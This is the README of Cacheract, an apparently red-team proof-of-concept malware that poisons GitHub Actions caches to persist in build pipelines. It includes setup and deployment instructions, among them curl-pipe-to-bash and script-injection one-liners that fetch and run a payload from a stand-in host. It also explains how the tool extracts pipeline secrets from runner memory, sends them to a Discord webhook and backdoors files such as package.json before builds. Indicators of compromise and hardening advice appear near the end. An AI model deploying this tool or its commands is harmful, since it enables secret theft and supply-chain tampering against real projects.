<h1 align="center">
😈 Cacheract 🧊
</h1>

<h2 align="center">GitHub Actions Cache Native Malware</h2>

> [!WARNING]
> This software is for educational purposes only. The author is **not** liable for any harm or damage resulting from its unauthorized use.

## What is Cacheract?

Cacheract is a novel proof-of-concept for cache-native malware targeting ephemeral GitHub Actions build pipelines. The core idea behind Cacheract is that a poisoned GitHub Actions cache provides a direct path to arbitrary code execution and file modification within victim pipelines.

Cacheract enhances this approach by opportunistically poisoning new cache entries to persist within a build pipeline. Its default implementation does not modify build outputs but instead reports pipeline telemetry and secrets to a webhook. Offensive Security practitioners can take advantage of Cacheract to simulate a compromised dependency in an upstream package. Typically, supply chain attacks target end consumers. This can be workstations or servers. However, Cacheract is designed to target Actions pipelines exclusively - if it lands on a machine that is not a GitHub Actions runner, it will exit silently.

Cacheract's most interesting behavior occurs when it executes in a default branch with a `GITHUB_TOKEN` that has `actions: write` permissions. In this scenario, Cacheract automatically downloads existing cache entries, updates the cache archive to include itself, deletes the old entry, and re-uploads the new, poisoned cache entry.

In this scenario, Cacheract has the potential to persist for weeks or even months. As long as a workflow runs every 7 days to warm the cache and the Cache holding Cacheract is not evicted, then Cacheract will continue to persist.

Cacheract supports GitHub-hosted Linux ARM and x64 runners. Due to configuration and permission differences, Cacheract does not operate on self-hosted runners, Windows, or macOS runners. Supporting MacOS and Windows GitHub hosted runners is an area for future research - the main hurdle is writing a binary that can extract the secrets from the `Runner.Worker` memory without any preconditions or pausing the process.

## Quick Start

1. Clone the Cacheract repository: `git clone https://github.com/adnaneKhan/cacheract`
2. **MANDATORY** Update `src/config.ts` and configure the `REPLACEMENTS` (URLs or Base64 encoded files), along with the `DISCORD_WEBHOOK`. You can set custom cache keys and versions here as well.

The default file contains example replacements (the Gato-X README and a hacked.txt file). You will want to remove them as part of any PoC or Red Team scenario.

3. Run `npm build` to build Cacheract. It will be in `dist/bundle.js`.
4. Leverage any privileged code execution within a repository by running `node bundle.js`. Currently, Cacheract DOES NOT support piping the file into `node` due to the self-insertation mechanism. You must save it to disk otherwise it will not be able to poison future caches with itself.

Below is an example deployment setup:

1. Initial deployment: `curl -sSfL https://your-payload.com/code.sh | bash`

* `code.sh` contains:

`curl -sSfL https://your-payload.com/cacheract.js > /tmp/cacheract.js && node /tmp/cacheract.js`

2. The `https://your-payload.com/cacheract.js` file contains the packed `bundle.js` produced after running `npm run build` with the Cacheract repository.


## What Does Cacheract Do?

Cacheract works by overwriting the `action.yml` file for subsequent actions used within the pipeline to point to malicious, trojanized code. For this proof-of-concept, it targets `actions/checkout`, as most pipelines that use caching also check out code.

Every time Cacheract runs, it reports information about the pipeline to a webhook. If the pipeline is using an `ubuntu-latest` runner, it uses memory dump techniques to silently extract all of the pipeline's secrets and sends them to a Discord webhook. Furthermore, the production build of Cacheract is near unnoticable within a pipeline. It executes during the Post Run phase of the `actions/checkout` reusable action and all stdout and stderr output is nulled.

![image](https://github.com/user-attachments/assets/b4fe2c80-044b-4776-a77b-71a54b9c6ed1)

![image](https://github.com/user-attachments/assets/5351bb2b-1fa1-4af0-a391-0fc56a92c0e9)

### Initial Infection

Any arbitrary code execution within a default branch workflow can deploy Cacheract. This can occur through a Pwn Request, Injection, or a compromised dependency. Cacheract does not need to know which repository it is running within to deploy itself, as long as the repository uses `actions/checkout` in workflows that utilize caches.

If Cacheract is running in a workflow with a `GITHUB_TOKEN` that has `actions: write` permissions, it will download the original cache entry, add the poisoned payload, delete the original entry, and re-upload the new, poisoned cache entry.

This is particularly effective when simulating compromised NPM or PyPi packages. If your pipeline performs a `pip install` or `npm install`, and one of your upstream dependencies contains a trojan, it could deploy Cacheract into your pipeline.

You can use [Gato-X](https://github.com/adnaneKhan/gato-x) to find projects that could be susceptible to Pwn Request or injection attacks that an attacker can use to deploy Cacheract.


### Propagation

Cache keys and entries change frequently. To persist, Cacheract must opportunistically poison newer cache entries. Cacheract accomplishes this by checking all unique cache keys and versions that exist in non-default branches and setting a default branch entry for them. The basis for this approach is that pull requests updating files used to derive cache keys (e.g., lockfiles) typically set these entries within the merge reference scope. By pre-poisoning these entries, Cacheract can persist even after the original cache key changes.

If there are no cache keys present, Cacheract will parse workflow files for cache key patterns, compute the cache key + version, and set the new value itself.

#### Configurable Cache Entries

While Cacheract tries to predict cache entries that will land in main via non-default branch keys + versions, it can never catch everything.

For custom cache entries, Cacheract allows specifying cache entries within the `config.ts` file. When Cacheract runs
it will set these entries if they are not occupied. This is a helpful feature for setting restore key entries as well.

Simply replace the `key` and `version` fields with your desired values.

```
// Define the EXPLICIT_ENTRIES constant with specific cache entries, along with a placeholder size.
// 
export const EXPLICIT_ENTRIES: ManualCacheEntry[] = [
    {
        key: "my-custom-cacheract-key",
        version: "hackerman",
    }
]
```

To determine what these values are, you can create a fork of your target repository and run workflows that create
cache entries. You can then see the values using the API:

Endpoint: https://api.github.com/repos/adnanekhan/cacheract/actions/caches

```
{
  "total_count": 2,
  "actions_caches": [
    {
      "id": 211,
      "ref": "refs/heads/main",
      "key": "my-custom-cacheract-key",
      "version": "hackerman",
      "last_accessed_at": "2024-12-17T20:17:31.320000000Z",
      "created_at": "2024-12-17T20:17:31.320000000Z",
      "size_in_bytes": 2076031
    },
    {
      "id": 210,
      "ref": "refs/heads/main",
      "key": "node-cache-Linux-x64-npm-3fbd8af749cc842ff537e5ff82eb006556f693518c7d74acb9befde8d1e0ba6e",
      "version": "04d00cc68e25ee34fd8b04095d0a46a28244d98af53e6925e47ed311d487b1d6",
      "last_accessed_at": "2024-12-17T20:17:29.730000000Z",
      "created_at": "2024-12-17T20:17:29.730000000Z",
      "size_in_bytes": 2076015
    }
  ]
}
```


### File Overwrites

Cacheract supports "Replacements". A replacement is a file that cacheract will pack into a modified cache entry in addition to itelf. Replacements will fire upon the _second_ execution of Cacheract. Replacements
are what you can use to demonstrate impact with Cacheract beyond information disclosure. A replacement could swap the `package.json` file of a target repository with a backdoored version, or silently swap out
a source file prior to compilation (like Solarwinds!).

The following is a Cacheract exploitation scenario where Cacheract executes in the `main` branch but does NOT have `actions: write` permission.

1 -> Implantation: Cacheract runs in default branch of victim workflow via backdoored upstream, Pwn Request, Injection, or malicious Insider.
2 -> Cache Identifiication: Cacheract identifies cache entries from non-default branches that do _not_ exist in `main`.
3 -> Cacheract will not be able to download the file from the child branch, but it will be able to create a new one in main.

Cacheract will simply add itself to an archive, AND add junk data to make the entry large enough to match the cache entry from
the non-default branch.

```
/tmp/A
/home/runner/work/_actions/actions/checkout/v4/
/home/runner/work/_actions/actions/checkout/v4/action.yml
/home/runner/work/_actions/actions/checkout/v4/dist/
/home/runner/work/_actions/actions/checkout/v4/dist/utility.js
```

4 -> Now, let's suppose the operator configured a replacement for the `/home/runner/work/victimrepo/victimrepo/package.json` file. Cacheract will also add that file to the archive. Since Actions caches use `tar -P` to extract the archive, this will over-write the `package.json` file upon a cache hit.

```
/tmp/A
/home/runner/work/_actions/actions/checkout/v4/
/home/runner/work/_actions/actions/checkout/v4/action.yml
/home/runner/work/_actions/actions/checkout/v4/dist/
/home/runner/work/_actions/actions/checkout/v4/dist/utility.js
/home/runner/work/victimrepo/victimrepo/package.json
```

5 -> Cacheract will archive the files and upload them to GitHub.

6 -> If there is a subsequent workflow that has a cache hit on that key (let's say a release workflow), then it will end up over-writing the `action.yml` for checkout along with the `package.json` file.

7 -> Workflow will perform unexpected activities during build. Example: package.json contains a second stage payload in a `prebuild` script, this script pulls down additional
malicious files that modify the build output entirely and obfuscates the output in build, finally it cleans the `package.json` to normal state.

8 -> Package on NPM contains obfuscated backdoor, which no trace of where the original source code came from.

#### Replacements Configuration

You can configure replacements by adding to the `Replacement[]` array in `src/config.js`. There are two ways to add a replacement. The first is a Base64 encoded string. This would be useful for smaller files like scripts or config files. The other replacement is a URL. Cacheract will make an HTTP GET request to
download the file and then write it out. This is useful if you have a larger file and do not want the Blue Team to see it. If the file is not present at the URL, then Cacheract will continue without writing out that file.

```ts
export const REPLACEMENTS: Replacement[] = [
    {
        FILE_PATH: "/home/runner/work/Cacheract/Cacheract/hacked.txt",
        FILE_CONTENT: "AAAAAA=="
    },
    {
        FILE_PATH: "/home/runner/work/Cacheract/Cacheract/README.md",
        FILE_URL: "https://raw.githubusercontent.com/AdnaneKhan/Gato-X/refs/heads/main/README.md"
    }
]
```

## Building

Cacheract is a Node.js application. Simply build it with `npm build`. Cacheract is roughly 1.4 MB in size. Cacheract does not include obfuscation, but you can add this if desired via a webpack plugin.

If you want to report telemetry, you should set the `DISCORD_WEBHOOK` value in the `src/config.ts` file _prior_ to building Cacheract.

```
git clone https://github.com/AdnaneKhan/Cacheract
npm build
```

## Deployment

Cacheract compiles to a single minified `bundle.js` that includes all dependencies. Any arbitrary code execution within a GitHub Actions pipeline can invoke Cacheract by running the bundled javascript file containing Cacheract and all of its dependencies.

```bash
node bundle.js
```

Cacheract handles the rest, including determining if the environment is suitable for implantation and automatically deploying itself into caches after validation.

In an Actions script injection scenario, you could use `$(curl -sSfL https://your-payload-domain.com > /tmp/run; node /tmp/run)` to deploy Cacheract. Note that Cacheract is only useful when deployed into main branch pipelines, otherwise it has no more value than running code as part of a Pwn Request.

## Future Work

- Add conditional post exploitation flow. Cacheract is designed to allow operators to jump to more privilegd pipelines. Cacheract will have features to detect when it is running in a more privileged pipeline and deploy additional code (such as for OIDC abuse, release tampering, etc.)
- Dynamic C2 capabilities. Support reaching out to specific domain for additional commands to execute.
- Termination date: Support automatically removing after a given date.
- Finish cache key + version prediction based on static analysis of workflow files (currently only does Node).
- Investigate reading the Runner.Worker memory using low-level Mach kernel API calls for GitHub Hosted OS X runners.
- Investigate reading the runner worker mrmory on Windows GitHub hosted runners.

## Indicators of Compromise

Cacheract produces cache entries that contain a distinctive set of files within the archive.

You can list them using: `tar -P -tf archive.tzstd`.

Sample output:

```
5a94dd5e46603967d514fcb5fd0fb1564a657d480631ea
../../../.npm/_cacache/content-v2/sha512/91/80/
../../../.npm/_cacache/content-v2/sha512/91/80/3c20971262d493d8163d23e48c0b7da70e9053dc9d8dbd6271f3e242b82765fc247523810a50944e88ff17b42731aa04d304624d75b07503c5d129b4deb7
/home/runner/work/_actions/actions/checkout/v4/
/home/runner/work/_actions/actions/checkout/v4/action.yml
/home/runner/work/_actions/actions/checkout/v4/dist/
/home/runner/work/_actions/actions/checkout/v4/dist/utility.js
```

Notice the `action.yml` and `utility.js` files.

## Removing Cacheract

To remove Cacheract from an infected repository, simply flush all cache entries. GitHub offers APIs to [list cache entries](https://docs.github.com/en/rest/actions/cache?apiVersion=2022-11-28#list-github-actions-caches-for-a-repository) and [delete them](https://docs.github.com/en/rest/actions/cache?apiVersion=2022-11-28#delete-github-actions-caches-for-a-repository-using-a-cache-key).

## Guarding Against Cacheract

Cacheract exists to highlight the dangers of insecure GitHub Actions workflow and caching configurations.

To avoid risks from cache poisoning attacks, do the following:

* Never consume caches in release builds.
* Never consume caches in workflows with highly sensitive secrets.
* Avoid use of Github Actions template expressions within `run` or `github-script` steps.
* Do not check out and run untrusted code on the `pull_request_target` trigger, which runs in the contet of the default branch.
* Do not check out and run untrusted code on the `issue_comment` trigger, which runs in the contet of the default branch.

<p align="center"><a href=#top>Return to Top</a></p>
